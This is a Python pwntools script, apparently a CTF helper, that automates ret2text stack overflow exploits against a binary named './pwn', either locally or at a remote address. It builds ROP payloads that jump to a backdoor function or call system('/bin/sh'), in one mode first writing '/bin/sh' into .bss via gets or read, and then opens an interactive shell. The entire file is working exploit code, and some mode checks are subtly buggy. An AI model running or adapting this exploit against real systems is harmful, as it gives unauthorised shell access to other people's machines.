# -*- coding: utf-8 -*-
# @Time     : 2023/11/12 22:55
# @Author   : 君叹
# @File     : ret2text.py
import logging.handlers

### 常见地， ret2text 都会存在一个后门函数地址
### 1 存在后门函数，即一个函数直接调用了 system('/bin/sh')
### 2 存在

from pwn import *
import argparse

parser = argparse.ArgumentParser(description="Process some integers")
parser.add_argument('-t', type=str, help='本地 or 远程地址')
parser.add_argument('-p', type=int, help='端口号')
parser.add_argument('-b', type=str, help='bit位')
parser.add_argument('-m', type=str,
                    help='模式 \n backdoor\t有直接可用的后门函数 \n nowrite\t有/bin/sh和system但是不连接\nwrite\n有system，/bin/sh需要写入')
parser.add_argument('-f', type=str, help='写入 /bin/sh 的函数')
arg_list = parser.parse_args()

ret = 0
backdoor = None
pop_rdi = None
system = None
bin_sh = None
read = None
gets = None
pop_rsi = None
pop_rdx = None
bss = None
to_binsh_flag = 0

if arg_list.t == 'local':
    io = process("./pwn")
else:
    io = remote(arg_list.t, arg_list.p)

if arg_list.b == '32':
    context(arch='i386', os='linux', log_level='debug')
    ebp_len = 4
elif arg_list.b == '64':
    context(arch='amd64', os='linux', log_level='debug')
    ret = int(input('ret address(input 0 -> not ret): '), 16)
    ebp_len = 8
else:
    log.error("bit位设置错误， 32 or 64")
    exit()


# gdb.attach(io, 'b main')

def get_value(name):
    value = input(f"{name} address(In hexadecimal, please start with 0x): ")
    value = int(value, 16) if '0x' in value else int(value)
    return value


elf = ELF('./pwn')
buf_length = input("栈距离ebp[rbp]的长度(In hexadecimal, please start with 0x): ")
buf_length = int(buf_length, 16) if '0x' in buf_length else int(buf_length)
if arg_list.m == 'backdoor':
    backdoor = get_value('backdoor') if backdoor is None else backdoor
    payload = flat([cyclic(buf_length + ebp_len), backdoor]) if ret == 0 else flat(
        [cyclic(buf_length + ebp_len), ret, backdoor])
elif arg_list.m == 'nowrite':
    system = elf.sym['system']
    bin_sh = get_value('bin_sh') if bin_sh is None else bin_sh
    if arg_list.b == '64':
        pop_rdi = get_value('pop_rdi') if pop_rdi is None else pop_rdi
        payload = flat([cyclic(buf_length + ebp_len), pop_rdi, bin_sh, system]) if ret == 0 else flat(
            [cyclic(buf_length + ebp_len), ret, pop_rdi, bin_sh, system]
        )
    else:
        payload = flat([cyclic(buf_length + ebp_len), system, 0, bin_sh])
elif arg_list.m == 'write':
    # 有 system, /bin/sh 需要写入
    # 需要 bss 段
    # gets or read 地址
    # gets 需要一个参数 ,read 需要3个
    to_binsh_flag = 1
    if arg_list.f == 'gets':
        bss = get_value('bss') if bss is None else bss
        gets = elf.sym['gets']
        system = elf.sym['system']
        if arg_list == '64':
            pop_rdi = get_value('pop_rdi') if pop_rdi is None else pop_rdi
            payload = flat(
                [cyclic(buf_length + ebp_len), pop_rdi, bss, gets, pop_rdi, bss, system]) if ret == 0 else flat(
                [cyclic(buf_length + ebp_len), ret, pop_rdi, bss, gets, pop_rdi, bss, system]
            )
        else:
            payload = flat([cyclic(buf_length + ebp_len), gets, system, bss, bss])

    elif arg_list.f == 'read':
        bss = get_value('bss') if bss is None else bss
        read = elf.sym['read']
        system = elf.sym['system']
        if arg_list == '64':
            pop_rdi = get_value('pop_rdi') if pop_rdi is None else pop_rdi
            log.error("这种情况寄存器结构有点乱，自己写下这里的代码吧")
            exit()
        else:
            payload = cyclic(0x12 + 4) + p32(read) + p32(system) + p32(0) + p32(bss) + p32(0x10) + p32(bss)

    else:
        log.error("暂时没这个函数，要不改下代码？")
        exit()
else:
    log.error("模式输入有误，-h 查看参数帮助")
    exit()

io.sendline(payload)
if to_binsh_flag == 1:
    io.sendline(b"/bin/sh\x00")
io.interactive()
